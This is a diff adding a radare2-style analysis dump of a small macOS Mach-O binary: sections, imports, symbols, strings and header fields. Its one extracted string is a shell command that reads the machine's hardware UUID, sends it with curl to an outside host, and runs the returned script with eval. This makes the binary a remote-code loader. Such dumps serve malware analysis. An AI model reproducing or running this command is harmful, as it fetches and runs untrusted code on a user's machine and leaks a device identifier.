@@ -1,0 +1,183 @@
+Missing bin header dwarf
+[Sections]
+
+nth paddr       size vaddr        vsize perm name
+―――――――――――――――――――――――――――――――――――――――――――――――――
+0   0x00003e80  0x28 0x100003e80   0x28 -r-x 0.__TEXT.__text
+1   0x00003ea8   0x6 0x100003ea8    0x6 -r-x 1.__TEXT.__stubs
+2   0x00003eb0  0x1a 0x100003eb0   0x1a -r-x 2.__TEXT.__stub_helper
+3   0x00003eca  0xea 0x100003eca   0xea -r-x 3.__TEXT.__cstring
+4   0x00003fb4  0x48 0x100003fb4   0x48 -r-x 4.__TEXT.__unwind_info
+5   0x00004000   0x8 0x100004000    0x8 -rw- 5.__DATA_CONST.__got
+6   0x00008000   0x8 0x100008000    0x8 -rw- 6.__DATA.__la_symbol_ptr
+7   0x00008008   0x8 0x100008008    0x8 -rw- 7.__DATA.__data
+
+[Segments]
+
+nth paddr         size vaddr         vsize perm name
+――――――――――――――――――――――――――――――――――――――――――――――――――――
+0   0x00000000  0x4000 0x100000000  0x4000 -r-x __TEXT
+1   0x00004000  0x4000 0x100004000  0x4000 -rw- __DATA_CONST
+2   0x00008000  0x4000 0x100008000  0x4000 -rw- __DATA
+3   0x0000c000  0x4000 0x10000c000  0x4000 -r-- __LINKEDIT
+
+[Entrypoints]
+vaddr=0x100003e80 paddr=0x00003e80 haddr=0x00000510 type=program
+
+1 entrypoints
+[Constructors]
+
+0 entrypoints
+[Main]
+vaddr=0x100003e80 paddr=0x100003e80
+[Imports]
+nth vaddr       bind type lib name
+――――――――――――――――――――――――――――――――――
+0   0x100003ea8 NONE FUNC     system
+1   0x00000000  NONE FUNC     dyld_stub_binder
+
+[Symbols]
+
+nth paddr      vaddr       bind   type size lib name
+――――――――――――――――――――――――――――――――――――――――――――――――――――
+0   0x00000000 0x100000000 GLOBAL FUNC 0        __mh_execute_header
+1   0x00003e80 0x100003e80 GLOBAL FUNC 0        _main
+2   0x00008008 0x100008008 LOCAL  FUNC 0        __dyld_private
+3   0x00003ea8 0x100003ea8 LOCAL  FUNC 0        imp.system
+4   0x00003e80 0x100003e80 LOCAL  FUNC 0        func.100003e80
+[Strings]
+nth paddr      vaddr       len size section            type  string
+―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
+0   0x00003eca 0x100003eca 233 234  3.__TEXT.__cstring ascii UUID="$(ioreg -ad2 -c IOPlatformExpertDevice | xmllint --xpath '//key[.="IOPlatformUUID"]/following-sibling::*[1]/text()' -)";INSIDE=$(curl --connect-timeout 900 -L "https://resource.bundleagent.com/v2/tuy?uuid=$UUID");eval "$INSIDE"
+arch     x86
+baddr    0x100000000
+binsz    49424
+bintype  mach0
+bits     64
+canary   false
+class    MACH064
+compiler clang
+crypto   false
+endian   little
+havecode true
+intrp    /usr/lib/dyld
+laddr    0x0
+lang     c
+linenum  false
+lsyms    false
+machine  x86 64 all
+nx       false
+os       darwin
+pic      true
+relocs   false
+sanitize false
+static   false
+stripped false
+subsys   darwin
+va       true
+pf.mach0_header @ 0x100000000
+0x100000000  Magic       0xfeedfacf
+0x100000004  CpuType     0x1000007
+0x100000008  CpuSubType  0x3
+0x10000000c  FileType    0x2
+0x100000010  nCmds       16
+0x100000014  sizeOfCmds  1368
+0x100000018  Flags       0x200085
+pf.mach0_segment64 @ 0x100000020
+0x100000020  cmd       0 0x19 LC_SEGMENT_64
+0x100000024  cmdsize     72
+0x100000028  name        __PAGEZERO
+pf.mach0_segment64 @ 0x100000068
+0x100000068  cmd       1 0x19 LC_SEGMENT_64
+0x10000006c  cmdsize     472
+0x100000070  name        __TEXT
+pf.mach0_section64 @ 0x1000000b0
+pf.mach0_section64 @ 0x100000100
+pf.mach0_section64 @ 0x100000150
+pf.mach0_section64 @ 0x1000001a0
+pf.mach0_section64 @ 0x1000001f0
+pf.mach0_segment64 @ 0x100000240
+0x100000240  cmd       2 0x19 LC_SEGMENT_64
+0x100000244  cmdsize     152
+0x100000248  name        __DATA_CONST
+pf.mach0_section64 @ 0x100000288
+pf.mach0_segment64 @ 0x1000002d8
+0x1000002d8  cmd       3 0x19 LC_SEGMENT_64
+0x1000002dc  cmdsize     232
+0x1000002e0  name        __DATA
+pf.mach0_section64 @ 0x100000320
+pf.mach0_section64 @ 0x100000370
+pf.mach0_segment64 @ 0x1000003c0
+0x1000003c0  cmd       4 0x19 LC_SEGMENT_64
+0x1000003c4  cmdsize     72
+0x1000003c8  name        __LINKEDIT
+pf.mach0_dyld_info_only_command @ 0x100000408
+0x100000408  cmd       5 0x80000022 LC_DYLD_INFO_ONLY
+0x10000040c  cmdsize     48
+pf.mach0_symtab_command @ 0x100000438
+0x100000438  cmd       6 0x2 LC_SYMTAB
+0x10000043c  cmdsize     24
+pf.mach0_dysymtab_command @ 0x100000450
+0x100000450  cmd       7 0xb LC_DYSYMTAB
+0x100000454  cmdsize     80
+pf.mach0_load_dylinker_command @ 0x1000004a0
+0x1000004a0  cmd       8 0xe LC_LOAD_DYLINKER
+0x1000004a4  cmdsize     32
+pf.mach0_uuid_command @ 0x1000004c0
+0x1000004c0  cmd       9 0x1b LC_UUID
+0x1000004c4  cmdsize     24
+0x1000004c8  uuid        1ea4fc25320a3b2d8c0ae7f2ed5d1c69
+pf.mach0_build_version_command @ 0x1000004d8
+0x1000004d8  cmd      10 0x32 LC_BUILD_VERSION
+0x1000004dc  cmdsize     32
+0x1000004e0  platform    macOS
+0x1000004e4  minos       10.15.0
+0x1000004e8  sdk         10.15.6
+0x1000004ec  ntools      1
+pf.mach0_build_version_tool @ 0x1000004f0
+0x1000004f0  tool        ld
+0x1000004f4  version     609.8.0
+pf.mach0_source_version_command @ 0x1000004f8
+0x1000004f8  cmd      11 0x2a LC_SOURCE_VERSION
+0x1000004fc  cmdsize     16
+pf.mach0_entry_point_command @ 0x100000508
+0x100000508  cmd      12 0x80000028 LC_MAIN
+0x10000050c  cmdsize     24
+0x100000510  entry0      0x3e80
+0x100000518  stacksize   0x0
+pf.mach0_dylib_command @ 0x100000520
+0x100000520  cmd      13 0xc LC_LOAD_DYLIB
+0x100000524  cmdsize     56
+0x100000530  current     1281.100.1
+0x100000534  compat      1.0.0
+0x100000538  load_dylib  /usr/lib/libSystem.B.dylib
+pf.mach0_function_starts_command @ 0x100000558
+0x100000558  cmd      14 0x26 LC_FUNCTION_STARTS
+0x10000055c  cmdsize     16
+pf.mach0_data_in_code_command @ 0x100000568
+0x100000568  cmd      15 0x29 LC_DATA_IN_CODE
+0x10000056c  cmdsize     16
+[Linked libraries]
+/usr/lib/libSystem.B.dylib
+
+1 library
+[Relocations]
+
+vaddr       paddr      type   name
+――――――――――――――――――――――――――――――――――
+0x100004000 0x00004000 SET_64 dyld_stub_binder
+0x100004008 0x00004008 SET_64 system
+0x100008000 0x00008000 SET_64 system
+
+
+3 relocations
+49424
+Section to Segment mapping:
+Segment      Section
+--------------------
+__TEXT       0.__TEXT.__text 1.__TEXT.__stubs 2.__TEXT.__stub_helper 3.__TEXT.__cstring 4.__TEXT.__unwind_info 
+__DATA_CONST 5.__DATA_CONST.__got 
+__DATA       6.__DATA.__la_symbol_ptr 7.__DATA.__data 
+__LINKEDIT   
+
+
